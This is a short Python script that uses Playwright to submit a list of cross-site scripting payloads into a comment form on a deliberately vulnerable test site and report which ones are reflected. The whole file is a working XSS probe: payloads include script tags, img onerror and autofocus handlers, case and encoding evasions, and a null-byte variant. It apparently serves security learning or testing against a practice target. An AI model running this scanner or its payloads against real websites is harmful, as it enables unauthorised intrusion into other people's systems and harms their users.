from playwright.sync_api import sync_playwright
from rich import print

payloads = [
    "<script>alert('detect simple xss')</script>",
    "<img src=x onerror=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "<ScRiPt>alert(1)</ScRiPt>",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
    "<script>%00alert(1)</script>"
    
]
write_comment = 'textarea[name="tbComment"]'
post_comment = 'input[type="submit"]'

with sync_playwright() as spr:
    browser = spr.firefox.launch(headless=True)
    page = browser.new_page()
    page.goto("http://testaspnet.vulnweb.com/Comments.aspx?id=2")
    for payload in payloads :
        page.fill(write_comment,payload)
        page.click(post_comment)
        if payload in page.content():
            print(f"[green] xss founded[/] for pyload:{payload}")
        else:
            print(f"[red] No xss detected[/] for pyload:{payload}")
        page = browser.new_page()
        page.goto("http://testaspnet.vulnweb.com/Comments.aspx?id=2")
    browser.close()
